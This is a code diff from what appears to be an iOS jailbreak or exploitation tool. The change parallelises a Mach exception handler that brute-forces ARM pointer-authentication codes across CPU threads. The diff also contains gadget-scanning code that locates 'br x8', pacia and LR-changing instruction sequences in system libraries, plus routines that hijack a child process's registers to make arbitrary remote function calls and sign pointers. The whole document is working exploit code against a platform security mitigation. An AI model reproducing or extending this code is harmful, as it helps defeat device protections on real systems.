@@ -10,9 +10,55 @@
 #import <os/lock.h>
 #import "AppDelegate.h"
 #include "taskporthaxx.h"
+#include <sys/sysctl.h>
+#include <stdatomic.h>
+#include <string.h>
 // These are provided by mig
 #include "mach_exc.h"
 #include "mach_excServer.h"
+// threading vars
+static pthread_mutex_t pac_mutex = PTHREAD_MUTEX_INITIALIZER;
+_Atomic bool global_found = false;
+_Atomic uint64_t global_result_ptr = 0;
+_Atomic uint32_t global_result_diversifier = 0;
+static uint64_t base_count = 0;
+static int ncpu = 1;
+
+static _Thread_local int current_thread_id = 0;
+static _Thread_local sem_t local_sem_input_ready;
+static _Thread_local sem_t local_sem_output_ready;
+static _Thread_local arm_thread_state64_internal *local_new_state;
+
+struct thread_info {
+    mach_port_t port;
+    uint64_t count;
+    int thread_id;
+    sem_t sem_input_ready;
+    sem_t sem_output_ready;
+    int num_exceptions_handled;
+    arm_thread_state64_internal *new_state;
+};
+static struct thread_info threads[16];
+static int num_threads = 0;
+
+static struct thread_info *get_thread_info(mach_port_t port) {
+    for (int i = 0; i < num_threads; i++) {
+        if (threads[i].port == port) {
+            return &threads[i];
+        }
+    }
+    return &threads[0]; // fallback
+}
+
+static int get_cpu_count(void) {
+    int mib[2] = {CTL_HW, HW_NCPU};
+    int count = 1;
+    size_t len = sizeof(count);
+    sysctl(mib, 2, &count, &len, NULL, 0);
+    return count > 0 ? count : 1;
+}
+
+mach_port_t setup_exception_server_with_id(int thread_id);
 
 uintptr_t brX8Address, changeLRAddress, paciaAddress;
 BOOL wantsDetach;
@@ -43,7 +89,7 @@ struct dyld_all_image_infos *_alt_dyld_get_all_image_infos(void) {
 }
 
 void DumpRegisters(const arm_thread_state64_internal *old_state) {
-    printf("Registers:\n"
+    NSLog(@"Registers:\n"
            " x0: 0x%016llx  x1: 0x%016llx  x2: 0x%016llx  x3: 0x%016llx\n"
            " x4: 0x%016llx  x5: 0x%016llx  x6: 0x%016llx  x7: 0x%016llx\n"
            " x8: 0x%016llx  x9: 0x%016llx x10: 0x%016llx x11: 0x%016llx\n"
@@ -60,10 +106,6 @@ void DumpRegisters(const arm_thread_state64_internal *old_state) {
            old_state->__fp, old_state->__lr, old_state->__pc, old_state->__sp, old_state->__cpsr);
 }
 
-dispatch_semaphore_t sem_input_ready;
-dispatch_semaphore_t sem_output_ready;
-int num_exceptions_handled = 0;
-arm_thread_state64_internal *new_state;
 kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_port,
                                                          mach_port_t thread,
                                                          mach_port_t task,
@@ -79,17 +121,30 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     if (*flavor != ARM_THREAD_STATE64) {
         return KERN_FAILURE;
     }
-    
+
     const arm_thread_state64_internal *old_state = (const arm_thread_state64_internal *)old_state_;
-    new_state = (arm_thread_state64_internal *)new_state_;
-    memcpy(new_state, old_state, sizeof(arm_thread_state64_t));
+    local_new_state = (arm_thread_state64_internal *)new_state_;
+    memcpy(local_new_state, old_state, sizeof(arm_thread_state64_t));
     *new_state_cnt = old_state_cnt;
-    
-    static uint64_t pacFailedCount = 0;
-    static uint64_t pacBruteForcedPtr = 0;
-    static uint32_t lastDiversifier = 0;
-    
-    if (num_exceptions_handled == 0) {
+
+    static _Thread_local uint64_t pacFailedCount = 0;
+    static _Thread_local uint64_t pacBruteForcedPtr = 0;
+    static _Thread_local uint32_t lastDiversifier = 0;
+
+    if (global_found) {
+        return KERN_FAILURE;
+    }
+
+    if (current_thread_id == 0) {
+        struct thread_info *tinfo = get_thread_info(exception_port);
+        current_thread_id = tinfo->thread_id;
+        local_sem_input_ready = tinfo->sem_input_ready;
+        local_sem_output_ready = tinfo->sem_output_ready;
+    }
+
+    static _Thread_local int first_exception = 1;
+    if (first_exception) {
+        first_exception = 0;
         printf("got task port: %d\n", task);
         GlobalChildTaskPort = task;
         GlobalChildThreadPort = thread;
@@ -98,12 +153,12 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         if (signed_pointer != 0) {
             pacBruteForcedPtr = signed_pointer;
         }
-        new_state->__lr = 0xFFFFFF00;
-        new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR;
-        new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
+        local_new_state->__lr = 0xFFFFFF00;
+        local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR;
+        local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR;
     }
-    
-    new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
+
+    local_new_state->__flags &= ~__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC; // clear some flags
     
     uint64_t ptrL = (uint64_t)(code[1] & 0xFFFFFFFFF);
     uint64_t ptrR = (uint64_t)(brX8Address & 0xFFFFFFFFF);
@@ -114,15 +169,30 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
         (ptrL == ptrR || code[1] == 0xffffffffffffffff)) {
         uint32_t diversifier = old_state->__flags & 0xFF000000;
         if (signed_pointer == 0) {
-            // Attempt to brute-force PAC
-            // (pacFailedCount<<39) & ~0x0080000000000000: clear kernel pointer bit
-            pacBruteForcedPtr = ((uint64_t)brX8Address & 0xFFFFFFFFF) | ((pacFailedCount << 39) & ~0x0080000000000000);
+            // each thread starts at different offset in 24 bits
+            // t0: [0,1,2,3,...], t1: [4M,4M+1,4M+2,...], etc.
+
+            static int total_threads = 1;
+            if (total_threads == 1) {
+                int mib[2] = {CTL_HW, HW_NCPU};
+                int cpu_count = 1;
+                size_t len = sizeof(cpu_count);
+                sysctl(mib, 2, &cpu_count, &len, NULL, 0);
+                total_threads = (cpu_count > 0 && cpu_count <= 8) ? cpu_count : 1;
+            }
+
+            uint64_t base_pac = ((uint64_t)brX8Address & 0xFFFFFFFFF);
+            uint64_t search_space = 1ULL << 24; // 24-bit PAC space
+            uint64_t thread_offset = (current_thread_id * (search_space / total_threads)) + pacFailedCount;
+            uint64_t pac_value = thread_offset & (search_space - 1); // wraparound
+
+            pacBruteForcedPtr = base_pac | ((pac_value << 39) & ~0x0080000000000000);
         } else if (signed_pointer == pacBruteForcedPtr) {
             pacBruteForcedPtr = signed_pointer;
         }
         lastDiversifier = diversifier;
         
-        new_state->__pc = pacBruteForcedPtr;
+        local_new_state->__pc = pacBruteForcedPtr;
         pacFailedCount++;
         if ((pacFailedCount & 0x3ffff) == 0) {
             printf("Still brute forcing PAC... total: %llu\n", pacFailedCount);
@@ -135,22 +205,27 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
     }
     
     //printf("exception handler raise state - exception %d\n", exception);
-    if(pacBruteForcedPtr && num_exceptions_handled > 0) {
-        // Only print a couple of times
+    static _Thread_local int exceptions_count = 0;
+    if(pacBruteForcedPtr && exceptions_count > 0) {
         static int count = 0;
         if (count < 2) {
             count++;
             printf("PAC brute forced!\n");
             printf("- ptr: 0x%016llx\n", pacBruteForcedPtr);
             printf("- div: 0x%08x\n", lastDiversifier);
+
+            atomic_store(&global_found, true);
+            atomic_store(&global_result_ptr, pacBruteForcedPtr);
+            atomic_store(&global_result_diversifier, lastDiversifier);
+
         }
         brX8Address = pacBruteForcedPtr;
         NSUserDefaults.standardUserDefaults.signedPointer = signed_pointer = pacBruteForcedPtr;
         NSUserDefaults.standardUserDefaults.signedDiversifier = lastDiversifier;
     }
-    
-    if (num_exceptions_handled > 0) {
-        dispatch_semaphore_signal(sem_output_ready);
+
+    if (exceptions_count > 0) {
+        sem_post(&local_sem_output_ready);
         if ((old_state->__lr & 0xFFFFFF00) != 0xFFFFFF00 || wantsDetach) {
             wantsDetach = NO;
             printf("Process might have crashed! unexpected lr value: 0x%llx\n", old_state->__lr);
@@ -158,40 +233,51 @@ kern_return_t catch_mach_exception_raise_state_identity (mach_port_t exception_p
             return KERN_FAILURE;
         }
     }
-    
-    __darwin_arm_thread_state64_set_pc_fptr(*new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
-    //new_state->__x[16] = (uint64_t)ptrauth_strip(dlsym(RTLD_DEFAULT, "sleep"), ptrauth_key_function_pointer);
-    dispatch_semaphore_wait(sem_input_ready, DISPATCH_TIME_FOREVER);
-    
-    num_exceptions_handled++;
+
+    __darwin_arm_thread_state64_set_pc_fptr(*local_new_state, ptrauth_sign_unauthenticated(ptrauth_strip((void *)brX8Address, ptrauth_key_function_pointer), ptrauth_key_function_pointer, 0));
+    sem_wait(&local_sem_input_ready);
+
+    exceptions_count++;
     return KERN_SUCCESS;
 }
 
 extern boolean_t mach_exc_server (mach_msg_header_t *msg, mach_msg_header_t *reply);
+
 static void exception_server(mach_port_t exceptionPort, BOOL shouldExitOnException) {
     mach_msg_return_t rt;
     __Request__mach_exception_raise_state_identity_t msg;
     __Reply__mach_exception_raise_state_identity_t reply;
     BOOL handled = NO;
- 
+
     do {
         rt = mach_msg((mach_msg_header_t *)&msg, MACH_RCV_MSG, 0, sizeof(union __RequestUnion__mach_exc_subsystem), exceptionPort, 0, MACH_PORT_NULL);
         assert(rt == MACH_MSG_SUCCESS);
-        
+
         handled = mach_exc_server((mach_msg_header_t *)&msg, (mach_msg_header_t *)&reply);
- 
+
         // Send the now-initialized reply
         rt = mach_msg((mach_msg_header_t *)&reply, MACH_SEND_MSG, reply.Head.msgh_size, 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
         assert(rt == MACH_MSG_SUCCESS);
     } while (!shouldExitOnException || !handled);
 }
 
+static void* exception_server_thread_func(void* arg) {
+    mach_port_t exceptionPort = (mach_port_t)arg;
+    exception_server(exceptionPort, NO);
+    return NULL;
+}
+
 mach_port_t setup_exception_server(void) {
-    sem_input_ready = dispatch_semaphore_create(0);
-    sem_output_ready = dispatch_semaphore_create(0);
-    
-    // TODO: save offsets
-    
+    return setup_exception_server_with_id(0);
+}
+
+mach_port_t setup_exception_server_with_id(int thread_id) {
+    struct thread_info *tinfo = &threads[num_threads];
+    tinfo->thread_id = thread_id;
+    sem_init(&tinfo->sem_input_ready, 0, 0);
+    sem_init(&tinfo->sem_output_ready, 0, 0);
+    tinfo->num_exceptions_handled = 0;
+
     // unauthenticated br x8 gadget
     void *handle = dlopen("/usr/lib/swift/libswiftDistributed.dylib", RTLD_GLOBAL);
     assert(handle != NULL);
@@ -207,68 +293,75 @@ mach_port_t setup_exception_server(void) {
         NSUserDefaults.standardUserDefaults.signedPointer = 0;
         NSUserDefaults.standardUserDefaults.signedDiversifier = 0;
     }
-    
+
     // PAC signing gadget
     func = (uint32_t *)zeroify_scalable_zone;
     for (; func[0] != 0xdac10230 || func[1] != 0xf9000110; func++) {}
     paciaAddress = (uint64_t)func;
     printf("Found pacia x16, x17 at address: 0x%016lx\n", paciaAddress);
-    
+
     // change LR gadget
     func = (uint32_t *)dispatch_debug;
     for (; func[0] != 0xaa0103fe || func[1] != 0xf9402008; func++) {}
     changeLRAddress = (uint64_t)func;
-    
-    // blraaz gadget
-    // libxpc.dylib`xpc_create_from_ce_der_with_key:
-    // 0x1e6e487d4 <+0>:   pacibsp
-    // ...
-    // libxpc.dylib`_objectForActiveContext:
-    // 0x1e6e48b8c <+416>: blraaz x8
-    // libxpc.dylib`___lldb_unnamed_symbol2690:
-    // 0x1e6e48b90 <+0>:   udf    #0xc
-//    func = (uint32_t *)xpc_create_from_ce_der_with_key;
-//    for (; func[0] != 0xd63f091f || func[1] != 0x0000000c; func++) {}
-//    blraazX8Address = (uint64_t)func;
-    
-    NSLog(@"exception server starting\n");
+
+    NSLog(@"exception server starting for thread %d\n", thread_id);
     mach_port_t server_port;
     kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
     assert(kr == KERN_SUCCESS);
     kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
     assert(kr == KERN_SUCCESS);
-    kr = bootstrap_register(bootstrap_port, "com.roothide.bootstrap.exception_server", server_port);
+
+    char service_name[128];
+    if (thread_id == 0) {
+        snprintf(service_name, sizeof(service_name), "com.roothide.bootstrap.exception_server");
+    } else {
+        snprintf(service_name, sizeof(service_name), "com.roothide.bootstrap.exception_server.%d", thread_id);
+    }
+    kr = bootstrap_register(bootstrap_port, service_name, server_port);
     assert(kr == KERN_SUCCESS);
-    NSLog(@"exception server registered on port 0x%x\n", server_port);
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        exception_server(server_port, NO);
-    });
+    NSLog(@"exception server %d registered on port 0x%x\n", thread_id, server_port);
+
+    threads[num_threads].port = server_port;
+    threads[num_threads].thread_id = thread_id;
+    num_threads++;
+
+    pthread_t exc_thread;
+    pthread_create(&exc_thread, NULL, exception_server_thread_func, (void*)server_port);
     return server_port;
 }
 
 os_unfair_lock funcLock = OS_UNFAIR_LOCK_INIT;
+void force_crash(void)
+{
+    local_new_state->__pc = brX8Address;
+    local_new_state->__x[8] = 0x0;
+    memset(&local_new_state->__x[0], 0, sizeof(local_new_state->__x));
+    sem_post(&local_sem_input_ready);
+    sem_wait(&local_sem_output_ready);
+}
 uint64_t RemoteArbCallInternal(char *name, uint64_t pc, uint64_t args[], int argCount) {
     // libswiftDistributed.dylib`swift_distributed_execute_target:
     // 0x20d1f0e58 <+352>: br     x8
-    
+
     if (argCount > 8) {
-        uint64_t sp = new_state->__sp; xpaci(sp);
+        uint64_t sp = local_new_state->__sp; xpaci(sp);
         for (int i = 8; i < argCount; i++) {
             RemoteWrite64(sp + sizeof(uint64_t[i-8]), args[i]);
         }
         argCount = 8;
     }
-    
+
     xpaci(pc);
-    new_state->__x[8] = pc;
-    memcpy(&new_state->__x[0], args, argCount * sizeof(uint64_t));
-    
+    local_new_state->__x[8] = pc;
+    memcpy(&local_new_state->__x[0], args, argCount * sizeof(uint64_t));
+
     printf("Calling function %s\n", name);
-    dispatch_semaphore_signal(sem_input_ready);
-    dispatch_semaphore_wait(sem_output_ready, DISPATCH_TIME_FOREVER);
-    
-    printf("- function returned x0=0x%llx\n", new_state->__x[0]);
-    return new_state->__x[0];
+    sem_post(&local_sem_input_ready);
+    sem_wait(&local_sem_output_ready);
+
+    printf("- function returned x0=0x%llx\n", local_new_state->__x[0]);
+    return local_new_state->__x[0];
 }
 
 uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier) {
@@ -277,10 +370,10 @@ uint64_t RemoteSignPACIA(uint64_t address, uint64_t modifier) {
     // 0x1b7102614 <+64>: str    x16, [x8, #0x10]
     // we're using br x8 to branch to here, and when it attempts to store to [x8],
     // it will crash and we can catch the exception to get the signed pointer
-    new_state->__x[16] = address;
-    new_state->__x[17] = modifier;
+    local_new_state->__x[16] = address;
+    local_new_state->__x[17] = modifier;
     RemoteArbCallInternal("pacia", paciaAddress, (uint64_t[]){}, 0);
-    return new_state->__x[16];
+    return local_new_state->__x[16];
 }
 
 void RemoteChangeLR(uint64_t newLR) {
